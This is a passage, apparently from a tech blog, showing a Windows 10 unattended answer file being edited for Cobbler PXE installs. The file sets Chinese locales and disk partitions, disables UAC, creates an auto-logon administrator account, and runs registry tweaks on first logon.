class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost kickstarts]# <span class="hljs-built_in">pwd</span><br>/var/lib/cobbler/kickstarts<br><br>[root@localhost kickstarts]# vim winpe.xml<br>&lt;!--*************************************************<br>Windows 10 Answer File Generator<br>Created using Windows AFG found at:<br>;http://www.windowsafg.com<br><br>Installation Notes<br>Location: zh-CN<br>Notes: Enter your comments here...<br>**************************************************--&gt;<br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;<br>&lt;unattend<br>    xmlns=<span class="hljs-string">&quot;urn:schemas-microsoft-com:unattend&quot;</span>&gt;<br>    &lt;settings pass=<span class="hljs-string">&quot;windowsPE&quot;</span>&gt;<br>        &lt;component name=<span class="hljs-string">&quot;Microsoft-Windows-International-Core-WinPE&quot;</span> processorArchitecture=<span class="hljs-string">&quot;x86&quot;</span> publicKeyToken=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> language=<span class="hljs-string">&quot;neutral&quot;</span> versionScope=<span class="hljs-string">&quot;nonSxS&quot;</span><br>            xmlns:wcm=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span><br>            xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;<br>            &lt;SetupUILanguage&gt;<br>                &lt;UILanguage&gt;en-US&lt;/UILanguage&gt;<br>            &lt;/SetupUILanguage&gt;<br>            &lt;InputLocale&gt;0804:&#123;81D4E9C9-1D3B-41BC-9E6C-4B40BF79E35E&#125;&#123;FA550B04-5AD7-411f-A5AC-CA038EC515D7&#125;&lt;/InputLocale&gt;<br>            &lt;SystemLocale&gt;zh-CN&lt;/SystemLocale&gt;<br>            &lt;UILanguage&gt;zh-CN&lt;/UILanguage&gt;<br>            &lt;UILanguageFallback&gt;zh-CN&lt;/UILanguageFallback&gt;<br>            &lt;UserLocale&gt;zh-CN&lt;/UserLocale&gt;<br>        &lt;/component&gt;<br>        &lt;component name=<span class="hljs-string">&quot;Microsoft-Windows-International-Core-WinPE&quot;</span> processorArchitecture=<span class="hljs-string">&quot;amd64&quot;</span> publicKeyToken=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> language=<span class="hljs-string">&quot;neutral&quot;</span> versionScope=<span class="hljs-string">&quot;nonSxS&quot;</span><br>            xmlns:wcm=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span><br>            xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;<br>            &lt;SetupUILanguage&gt;<br>                &lt;UILanguage&gt;en-US&lt;/UILanguage&gt;<br>            &lt;/SetupUILanguage&gt;<br>            &lt;InputLocale&gt;0804:&#123;81D4E9C9-1D3B-41BC-9E6C-4B40BF79E35E&#125;&#123;FA550B04-5AD7-411f-A5AC-CA038EC515D7&#125;&lt;/InputLocale&gt;<br>            &lt;SystemLocale&gt;zh-CN&lt;/SystemLocale&gt;<br>            &lt;UILanguage&gt;zh-CN&lt;/UILanguage&gt;<br>            &lt;UILanguageFallback&gt;zh-CN&lt;/UILanguageFallback&gt;<br>            &lt;UserLocale&gt;zh-CN&lt;/UserLocale&gt;<br>        &lt;/component&gt;<br>        &lt;component name=<span class="hljs-string">&quot;Microsoft-Windows-Setup&quot;</span> processorArchitecture=<span class="hljs-string">&quot;x86&quot;</span> publicKeyToken=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> language=<span class="hljs-string">&quot;neutral&quot;</span> versionScope=<span class="hljs-string">&quot;nonSxS&quot;</span><br>            xmlns:wcm=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span><br>            xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;<br>            &lt;DiskConfiguration&gt;<br>                &lt;Disk wcm:action=<span class="hljs-string">&quot;add&quot;</span>&gt;<br>                    &lt;CreatePartitions&gt;<br>                        &lt;CreatePartition wcm:action=<span class="hljs-string">&quot;add&quot;</span>&gt;<br>                            &lt;Order&gt;1&lt;/Order&gt;<br>                            &lt;Type&gt;Primary&lt;/Type&gt;<br>                            &lt;Size&gt;100&lt;/Size&gt;<br>                        &lt;/CreatePartition&gt;<br>                        &lt;CreatePartition wcm:action=<span class="hljs-string">&quot;add&quot;</span>&gt;<br>                            &lt;Extend&gt;<span class="hljs-literal">true</span>&lt;/Extend&gt;<br>                            &lt;Order&gt;2&lt;/Order&gt;<br>                            &lt;Type&gt;Primary&lt;/Type&gt;<br>                        &lt;/CreatePartition&gt;<br>                    &lt;/CreatePartitions&gt;<br>                    &lt;ModifyPartitions&gt;<br>                        &lt;ModifyPartition wcm:action=<span class="hljs-string">&quot;add&quot;</span>&gt;<br>                            &lt;Active&gt;<span class="hljs-literal">true</span>&lt;/Active&gt;<br>                            &lt;Format&gt;NTFS&lt;/Format&gt;<br>                            &lt;Label&gt;System Reserved&lt;/Label&gt;<br>                            &lt;Order&gt;1&lt;/Order&gt;<br>                            &lt;PartitionID&gt;1&lt;/PartitionID&gt;<br>                            &lt;TypeID&gt;0x27&lt;/TypeID&gt;<br>                        &lt;/ModifyPartition&gt;<br>                        &lt;ModifyPartition wcm:action=<span class="hljs-string">&quot;add&quot;</span>&gt;<br>                            &lt;Active&gt;<span class="hljs-literal">true</span>&lt;/Active&gt;<br>                            &lt;Format&gt;NTFS&lt;/Format&gt;<br>                            &lt;Label&gt;OS&lt;/Label&gt;<br>                            &lt;Letter&gt;C&lt;/Letter&gt;<br>                            &lt;Order&gt;2&lt;/Order&gt;<br>                            &lt;PartitionID&gt;2&lt;/PartitionID&gt;<br>                        &lt;/ModifyPartition&gt;<br>                    &lt;/ModifyPartitions&gt;<br>                    &lt;DiskID&gt;0&lt;/DiskID&gt;<br>                    &lt;WillWipeDisk&gt;<span class="hljs-literal">true</span>&lt;/WillWipeDisk&gt;<br>                &lt;/Disk&gt;<br>            &lt;/DiskConfiguration&gt;<br>            &lt;ImageInstall&gt;<br>                &lt;OSImage&gt;<br>                    &lt;InstallTo&gt;<br>                        &lt;DiskID&gt;0&lt;/DiskID&gt;<br>                        &lt;PartitionID&gt;2&lt;/PartitionID&gt;<br>                    &lt;/InstallTo&gt;<br>                    &lt;InstallToAvailablePartition&gt;<span class="hljs-literal">false</span>&lt;/InstallToAvailablePartition&gt;<br>                &lt;/OSImage&gt;<br>            &lt;/ImageInstall&gt;<br>            &lt;UserData&gt;<br>                &lt;AcceptEula&gt;<span class="hljs-literal">true</span>&lt;/AcceptEula&gt;<br>                &lt;FullName&gt;AnJia&lt;/FullName&gt;<br>                &lt;Organization&gt;AnJia&lt;/Organization&gt;<br>                &lt;ProductKey&gt;<br>                    &lt;Key&gt;VK7JG-NPHTM-C97JM-9MPGT-3V66T&lt;/Key&gt;<br>                &lt;/ProductKey&gt;<br>            &lt;/UserData&gt;<br>        &lt;/component&gt;<br>        &lt;component name=<span class="hljs-string">&quot;Microsoft-Windows-Setup&quot;</span> processorArchitecture=<span class="hljs-string">&quot;amd64&quot;</span> publicKeyToken=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> language=<span class="hljs-string">&quot;neutral&quot;</span> versionScope=<span class="hljs-string">&quot;nonSxS&quot;</span><br>            xmlns:wcm=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span><br>            xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;<br>            &lt;DiskConfiguration&gt;<br>                &lt;Disk wcm:action=<span class="hljs-string">&quot;add&quot;</span>&gt;<br>                    &lt;CreatePartitions&gt;<br>                        &lt;CreatePartition wcm:action=<span class="hljs-string">&quot;add&quot;</span>&gt;<br>                            &lt;Order&gt;1&lt;/Order&gt;<br>                            &lt;Type&gt;Primary&lt;/Type&gt;<br>                            &lt;Size&gt;100&lt;/Size&gt;<br>                        &lt;/CreatePartition&gt;<br>                        &lt;CreatePartition wcm:action=<span class="hljs-string">&quot;add&quot;</span>&gt;<br>                            &lt;Extend&gt;<span class="hljs-literal">true</span>&lt;/Extend&gt;<br>                            &lt;Order&gt;2&lt;/Order&gt;<br>                            &lt;Type&gt;Primary&lt;/Type&gt;<br>                        &lt;/CreatePartition&gt;<br>                    &lt;/CreatePartitions&gt;<br>                    &lt;ModifyPartitions&gt;<br>                        &lt;ModifyPartition wcm:action=<span class="hljs-string">&quot;add&quot;</span>&gt;<br>                            &lt;Active&gt;<span class="hljs-literal">true</span>&lt;/Active&gt;<br>                            &lt;Format&gt;NTFS&lt;/Format&gt;<br>                            &lt;Label&gt;System Reserved&lt;/Label&gt;<br>                            &lt;Order&gt;1&lt;/Order&gt;<br>                            &lt;PartitionID&gt;1&lt;/PartitionID&gt;<br>                            &lt;TypeID&gt;0x27&lt;/TypeID&gt;<br>                        &lt;/ModifyPartition&gt;<br>                        &lt;ModifyPartition wcm:action=<span class="hljs-string">&quot;add&quot;</span>&gt;<br>                            &lt;Active&gt;<span class="hljs-literal">true</span>&lt;/Active&gt;<br>                            &lt;Format&gt;NTFS&lt;/Format&gt;<br>                            &lt;Label&gt;OS&lt;/Label&gt;<br>                            &lt;Letter&gt;C&lt;/Letter&gt;<br>                            &lt;Order&gt;2&lt;/Order&gt;<br>                            &lt;PartitionID&gt;2&lt;/PartitionID&gt;<br>                        &lt;/ModifyPartition&gt;<br>                    &lt;/ModifyPartitions&gt;<br>                    &lt;DiskID&gt;0&lt;/DiskID&gt;<br>                    &lt;WillWipeDisk&gt;<span class="hljs-literal">true</span>&lt;/WillWipeDisk&gt;<br>                &lt;/Disk&gt;<br>            &lt;/DiskConfiguration&gt;<br>            &lt;ImageInstall&gt;<br>                &lt;OSImage&gt;<br>                    &lt;InstallTo&gt;<br>                        &lt;DiskID&gt;0&lt;/DiskID&gt;<br>                        &lt;PartitionID&gt;2&lt;/PartitionID&gt;<br>                    &lt;/InstallTo&gt;<br>                    &lt;InstallToAvailablePartition&gt;<span class="hljs-literal">false</span>&lt;/InstallToAvailablePartition&gt;<br>                &lt;/OSImage&gt;<br>            &lt;/ImageInstall&gt;<br>            &lt;UserData&gt;<br>                &lt;AcceptEula&gt;<span class="hljs-literal">true</span>&lt;/AcceptEula&gt;<br>                &lt;FullName&gt;AnJia&lt;/FullName&gt;<br>                &lt;Organization&gt;AnJia&lt;/Organization&gt;<br>                &lt;ProductKey&gt;<br>                    &lt;Key&gt;VK7JG-NPHTM-C97JM-9MPGT-3V66T&lt;/Key&gt;<br>                &lt;/ProductKey&gt;<br>            &lt;/UserData&gt;<br>        &lt;/component&gt;<br>    &lt;/settings&gt;<br>    &lt;settings pass=<span class="hljs-string">&quot;offlineServicing&quot;</span>&gt;<br>        &lt;component name=<span class="hljs-string">&quot;Microsoft-Windows-LUA-Settings&quot;</span> processorArchitecture=<span class="hljs-string">&quot;x86&quot;</span> publicKeyToken=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> language=<span class="hljs-string">&quot;neutral&quot;</span> versionScope=<span class="hljs-string">&quot;nonSxS&quot;</span><br>            xmlns:wcm=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span><br>            xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;<br>            &lt;EnableLUA&gt;<span class="hljs-literal">false</span>&lt;/EnableLUA&gt;<br>        &lt;/component&gt;<br>    &lt;/settings&gt;<br>    &lt;settings pass=<span class="hljs-string">&quot;offlineServicing&quot;</span>&gt;<br>        &lt;component name=<span class="hljs-string">&quot;Microsoft-Windows-LUA-Settings&quot;</span> processorArchitecture=<span class="hljs-string">&quot;amd64&quot;</span> publicKeyToken=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> language=<span class="hljs-string">&quot;neutral&quot;</span> versionScope=<span class="hljs-string">&quot;nonSxS&quot;</span><br>            xmlns:wcm=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span><br>            xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;<br>            &lt;EnableLUA&gt;<span class="hljs-literal">false</span>&lt;/EnableLUA&gt;<br>        &lt;/component&gt;<br>    &lt;/settings&gt;<br>    &lt;settings pass=<span class="hljs-string">&quot;generalize&quot;</span>&gt;<br>        &lt;component name=<span class="hljs-string">&quot;Microsoft-Windows-Security-SPP&quot;</span> processorArchitecture=<span class="hljs-string">&quot;x86&quot;</span> publicKeyToken=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> language=<span class="hljs-string">&quot;neutral&quot;</span> versionScope=<span class="hljs-string">&quot;nonSxS&quot;</span><br>            xmlns:wcm=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span><br>            xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;<br>            &lt;SkipRearm&gt;1&lt;/SkipRearm&gt;<br>        &lt;/component&gt;<br>    &lt;/settings&gt;<br>    &lt;settings pass=<span class="hljs-string">&quot;generalize&quot;</span>&gt;<br>        &lt;component name=<span class="hljs-string">&quot;Microsoft-Windows-Security-SPP&quot;</span> processorArchitecture=<span class="hljs-string">&quot;amd64&quot;</span> publicKeyToken=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> language=<span class="hljs-string">&quot;neutral&quot;</span> versionScope=<span class="hljs-string">&quot;nonSxS&quot;</span><br>            xmlns:wcm=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span><br>            xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;<br>            &lt;SkipRearm&gt;1&lt;/SkipRearm&gt;<br>        &lt;/component&gt;<br>    &lt;/settings&gt;<br>    &lt;settings pass=<span class="hljs-string">&quot;specialize&quot;</span>&gt;<br>        &lt;component name=<span class="hljs-string">&quot;Microsoft-Windows-International-Core&quot;</span> processorArchitecture=<span class="hljs-string">&quot;x86&quot;</span> publicKeyToken=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> language=<span class="hljs-string">&quot;neutral&quot;</span> versionScope=<span class="hljs-string">&quot;nonSxS&quot;</span><br>            xmlns:wcm=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span><br>            xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;<br>            &lt;InputLocale&gt;0804:&#123;81D4E9C9-1D3B-41BC-9E6C-4B40BF79E35E&#125;&#123;FA550B04-5AD7-411f-A5AC-CA038EC515D7&#125;&lt;/InputLocale&gt;<br>            &lt;SystemLocale&gt;zh-CN&lt;/SystemLocale&gt;<br>            &lt;UILanguage&gt;zh-CN&lt;/UILanguage&gt;<br>            &lt;UILanguageFallback&gt;zh-CN&lt;/UILanguageFallback&gt;<br>            &lt;UserLocale&gt;zh-CN&lt;/UserLocale&gt;<br>        &lt;/component&gt;<br>        &lt;component name=<span class="hljs-string">&quot;Microsoft-Windows-International-Core&quot;</span> processorArchitecture=<span class="hljs-string">&quot;amd64&quot;</span> publicKeyToken=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> language=<span class="hljs-string">&quot;neutral&quot;</span> versionScope=<span class="hljs-string">&quot;nonSxS&quot;</span><br>            xmlns:wcm=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span><br>            xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;<br>            &lt;InputLocale&gt;0804:&#123;81D4E9C9-1D3B-41BC-9E6C-4B40BF79E35E&#125;&#123;FA550B04-5AD7-411f-A5AC-CA038EC515D7&#125;&lt;/InputLocale&gt;<br>            &lt;SystemLocale&gt;zh-CN&lt;/SystemLocale&gt;<br>            &lt;UILanguage&gt;zh-CN&lt;/UILanguage&gt;<br>            &lt;UILanguageFallback&gt;zh-CN&lt;/UILanguageFallback&gt;<br>            &lt;UserLocale&gt;zh-CN&lt;/UserLocale&gt;<br>        &lt;/component&gt;<br>        &lt;component name=<span class="hljs-string">&quot;Microsoft-Windows-Security-SPP-UX&quot;</span> processorArchitecture=<span class="hljs-string">&quot;x86&quot;</span> publicKeyToken=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> language=<span class="hljs-string">&quot;neutral&quot;</span> versionScope=<span class="hljs-string">&quot;nonSxS&quot;</span><br>            xmlns:wcm=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span><br>            xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;<br>            &lt;SkipAutoActivation&gt;<span class="hljs-literal">true</span>&lt;/SkipAutoActivation&gt;<br>        &lt;/component&gt;<br>        &lt;component name=<span class="hljs-string">&quot;Microsoft-Windows-Security-SPP-UX&quot;</span> processorArchitecture=<span class="hljs-string">&quot;amd64&quot;</span> publicKeyToken=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> language=<span class="hljs-string">&quot;neutral&quot;</span> versionScope=<span class="hljs-string">&quot;nonSxS&quot;</span><br>            xmlns:wcm=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span><br>            xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;<br>            &lt;SkipAutoActivation&gt;<span class="hljs-literal">true</span>&lt;/SkipAutoActivation&gt;<br>        &lt;/component&gt;<br>        &lt;component name=<span class="hljs-string">&quot;Microsoft-Windows-SQMApi&quot;</span> processorArchitecture=<span class="hljs-string">&quot;x86&quot;</span> publicKeyToken=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> language=<span class="hljs-string">&quot;neutral&quot;</span> versionScope=<span class="hljs-string">&quot;nonSxS&quot;</span><br>            xmlns:wcm=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span><br>            xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;<br>            &lt;CEIPEnabled&gt;0&lt;/CEIPEnabled&gt;<br>        &lt;/component&gt;<br>        &lt;component name=<span class="hljs-string">&quot;Microsoft-Windows-SQMApi&quot;</span> processorArchitecture=<span class="hljs-string">&quot;amd64&quot;</span> publicKeyToken=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> language=<span class="hljs-string">&quot;neutral&quot;</span> versionScope=<span class="hljs-string">&quot;nonSxS&quot;</span><br>            xmlns:wcm=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span><br>            xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;<br>            &lt;CEIPEnabled&gt;0&lt;/CEIPEnabled&gt;<br>        &lt;/component&gt;<br>        &lt;component name=<span class="hljs-string">&quot;Microsoft-Windows-Shell-Setup&quot;</span> processorArchitecture=<span class="hljs-string">&quot;x86&quot;</span> publicKeyToken=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> language=<span class="hljs-string">&quot;neutral&quot;</span> versionScope=<span class="hljs-string">&quot;nonSxS&quot;</span><br>            xmlns:wcm=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span><br>            xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;<br>            &lt;ComputerName&gt;AnJia-PC&lt;/ComputerName&gt;<br>            &lt;ProductKey&gt;VK7JG-NPHTM-C97JM-9MPGT-3V66T&lt;/ProductKey&gt;<br>        &lt;/component&gt;<br>        &lt;component name=<span class="hljs-string">&quot;Microsoft-Windows-Shell-Setup&quot;</span> processorArchitecture=<span class="hljs-string">&quot;amd64&quot;</span> publicKeyToken=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> language=<span class="hljs-string">&quot;neutral&quot;</span> versionScope=<span class="hljs-string">&quot;nonSxS&quot;</span><br>            xmlns:wcm=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span><br>            xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;<br>            &lt;ComputerName&gt;AnJia-PC&lt;/ComputerName&gt;<br>            &lt;ProductKey&gt;VK7JG-NPHTM-C97JM-9MPGT-3V66T&lt;/ProductKey&gt;<br>        &lt;/component&gt;<br>    &lt;/settings&gt;<br>    &lt;settings pass=<span class="hljs-string">&quot;oobeSystem&quot;</span>&gt;<br>        &lt;component name=<span class="hljs-string">&quot;Microsoft-Windows-Shell-Setup&quot;</span> processorArchitecture=<span class="hljs-string">&quot;x86&quot;</span> publicKeyToken=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> language=<span class="hljs-string">&quot;neutral&quot;</span> versionScope=<span class="hljs-string">&quot;nonSxS&quot;</span><br>            xmlns:wcm=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span><br>            xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;<br>            &lt;AutoLogon&gt;<br>                &lt;Password&gt;<br>                    &lt;Value&gt;&lt;/Value&gt;<br>                    &lt;PlainText&gt;<span class="hljs-literal">true</span>&lt;/PlainText&gt;<br>                &lt;/Password&gt;<br>                &lt;Enabled&gt;<span class="hljs-literal">true</span>&lt;/Enabled&gt;<br>                &lt;Username&gt;AnJia&lt;/Username&gt;<br>            &lt;/AutoLogon&gt;<br>            &lt;OOBE&gt;<br>                &lt;HideEULAPage&gt;<span class="hljs-literal">true</span>&lt;/HideEULAPage&gt;<br>                &lt;HideOEMRegistrationScreen&gt;<span class="hljs-literal">true</span>&lt;/HideOEMRegistrationScreen&gt;<br>                &lt;HideOnlineAccountScreens&gt;<span class="hljs-literal">true</span>&lt;/HideOnlineAccountScreens&gt;<br>                &lt;HideWirelessSetupInOOBE&gt;<span class="hljs-literal">true</span>&lt;/HideWirelessSetupInOOBE&gt;<br>                &lt;NetworkLocation&gt;Work&lt;/NetworkLocation&gt;<br>                &lt;SkipUserOOBE&gt;<span class="hljs-literal">true</span>&lt;/SkipUserOOBE&gt;<br>                &lt;SkipMachineOOBE&gt;<span class="hljs-literal">true</span>&lt;/SkipMachineOOBE&gt;<br>                &lt;ProtectYourPC&gt;1&lt;/ProtectYourPC&gt;<br>            &lt;/OOBE&gt;<br>            &lt;UserAccounts&gt;<br>                &lt;LocalAccounts&gt;<br>                    &lt;LocalAccount wcm:action=<span class="hljs-string">&quot;add&quot;</span>&gt;<br>                        &lt;Password&gt;<br>                            &lt;Value&gt;&lt;/Value&gt;<br>                            &lt;PlainText&gt;<span class="hljs-literal">true</span>&lt;/PlainText&gt;<br>                        &lt;/Password&gt;<br>                        &lt;Description&gt;AnJia&lt;/Description&gt;<br>                        &lt;DisplayName&gt;AnJia&lt;/DisplayName&gt;<br>                        &lt;Group&gt;Administrators&lt;/Group&gt;<br>                        &lt;Name&gt;AnJia&lt;/Name&gt;<br>                    &lt;/LocalAccount&gt;<br>                &lt;/LocalAccounts&gt;<br>            &lt;/UserAccounts&gt;<br>            &lt;RegisteredOrganization&gt;AnJia&lt;/RegisteredOrganization&gt;<br>            &lt;RegisteredOwner&gt;AnJia&lt;/RegisteredOwner&gt;<br>            &lt;DisableAutoDaylightTimeSet&gt;<span class="hljs-literal">false</span>&lt;/DisableAutoDaylightTimeSet&gt;<br>            &lt;FirstLogonCommands&gt;<br>                &lt;SynchronousCommand wcm:action=<span class="hljs-string">&quot;add&quot;</span>&gt;<br>                    &lt;Description&gt;Control Panel View&lt;/Description&gt;<br>                    &lt;Order&gt;1&lt;/Order&gt;<br>                    &lt;CommandLine&gt;reg add <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel&quot;</span> /v StartupPage /t REG_DWORD /d 1 /f&lt;/CommandLine&gt;<br>                    &lt;RequiresUserInput&gt;<span class="hljs-literal">true</span>&lt;/RequiresUserInput&gt;<br>                &lt;/SynchronousCommand&gt;<br>                &lt;SynchronousCommand wcm:action=<span class="hljs-string">&quot;add&quot;</span>&gt;<br>                    &lt;Order&gt;2&lt;/Order&gt;<br>                    &lt;Description&gt;Control Panel Icon Size&lt;/Description&gt;<br>                    &lt;RequiresUserInput&gt;<span class="hljs-literal">false</span>&lt;/RequiresUserInput&gt;<br>                    &lt;CommandLine&gt;reg add <span class="hljs-string">&quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel&quot;</span> /v AllItemsIconView /t REG_DWORD /d 0 /f&lt;/CommandLine&gt;<br>                &lt;/SynchronousCommand&gt;<br>                &lt;SynchronousCommand wcm:action=<span class="hljs-string">&quot;add&quot;</span>&gt;<br>                    &lt;Order&gt;3&lt;/Order&gt;<br>                    &lt;RequiresUserInput&gt;<span class="hljs-literal">false</span>&lt;/RequiresUserInput&gt;<br>                    &lt;CommandLine&gt;cmd /C wmic useraccount <span class="hljs-built_in">where</span> name=<span class="hljs-string">&quot;AnJia&quot;</span> <span class="hljs-built_in">set</span> PasswordExpires=<span class="hljs-literal">false</span>&lt;/CommandLine&gt;<br>                    &lt;Description&gt;Password Never Expires&lt;/Description&gt;<br>                &lt;/SynchronousCommand&gt;<br>            &lt;/FirstLogonCommands&gt;<br>            &lt;TimeZone&gt;China Standard Time&lt;/TimeZone&gt;<br>        &lt;/component&gt;<br>        &lt;component name=<span class="hljs-string">&quot;Microsoft-Windows-Shell-Setup&quot;</span> processorArchitecture=<span class="hljs-string">&quot;amd64&quot;</span> publicKeyToken=<span class="hljs-string">&quot;31bf3856ad364e35&quot;</span> language=<span class="hljs-string">&quot;neutral&quot;</span> versionScope=<span class="hljs-string">&quot;nonSxS&quot;</span><br>            xmlns:wcm=<span class="hljs-string">&quot;http://schemas.microsoft.com/WMIConfig/2002/State&quot;</span><br>            xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>&gt;<br>            &lt;AutoLogon&gt;<br>                &lt;Password&gt;<br>                    &lt;Value&gt;&lt;/Value&gt;<br>                    &lt;PlainText&gt;<span class="hljs-literal">true</span>&lt;/PlainText&gt;<br>                &lt;/Password&gt;<br>                &lt;Enabled&gt;<span class="hljs-literal">true</span>&lt;/Enabled&gt;<br>                &lt;Username&gt;AnJia&lt;/Username&gt;<br>            &lt;/AutoLogon&gt;<br>            &lt;OOBE&gt;<br>                &lt;HideEULAPage&gt;<span class="hljs-literal">true</span>&lt;/HideEULAPage&gt;<br>                &lt;HideOEMRegistrationScreen&gt;<span class="hljs-literal">true</span>&lt;/HideOEMRegistrationScreen&gt;<br>                &lt;HideOnlineAccountScreens&gt;<span class="hljs-literal">true</span>&lt;/HideOnlineAccountScreens&gt;<br>                &lt;HideWirelessSetupInOOBE&gt;<span class="hljs-literal">true</span>&lt;/HideWirelessSetupInOOBE&gt;<br>                &lt;NetworkLocation&gt;Work&lt;/NetworkLocation&gt;<br>                &lt;SkipUserOOBE&gt;<span class="hljs-literal">true</span>&lt;/SkipUserOOBE&gt;<br>                &lt;SkipMachineOOBE&gt;<span class="hljs-literal">true</span>&lt;/SkipMachineOOBE&gt;<br>                &lt;ProtectYourPC&gt;1&lt;/ProtectYourPC&gt;<br>            &lt;/OOBE&gt;<br>            &lt;UserAccounts&gt;<br>                &lt;LocalAccounts&gt;<br>                    &lt;LocalAccount wcm:action=<span class="hljs-string">&quot;add&quot;</span>&gt;<br>                        &lt;Password&gt;<br>                            &lt;Value&gt;&lt;/Value&gt;<br>                            &lt;PlainText&gt;<span class="hljs-literal">true</span>&lt;/PlainText&gt;<br>                        &lt;/Password&gt;<br>                        